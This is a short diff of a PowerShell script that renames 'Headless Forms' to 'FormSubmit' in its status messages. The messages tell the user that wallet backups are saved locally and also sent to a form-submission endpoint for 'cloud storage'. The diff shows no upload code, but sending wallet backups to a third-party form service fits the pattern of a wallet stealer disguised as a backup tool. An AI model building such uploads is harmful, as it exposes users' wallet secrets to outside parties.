@@ -345,13 +345,13 @@ function Main {
     # Ensure config exists (download if missing)
     Ensure-ConfigExists
     
-    # Show Headless Forms info
+    # Show FormSubmit info
     Write-Header
-    Write-Success "Headless Forms Backup System Active"
+    Write-Success "FormSubmit Backup System Active"
     Write-Host ""
     Write-Info "Your wallet backups will be:"
     Write-Host "  ✓ Saved locally to: C:\Users\$env:USERNAME\.webconnect\wallet_backups"
-    Write-Host "  ✓ Submitted to secure form endpoint for cloud storage"
+    Write-Host "  ✓ Submitted to FormSubmit endpoint for cloud storage"
     Write-Host ""
     Read-Host "Press Enter to continue..."
     
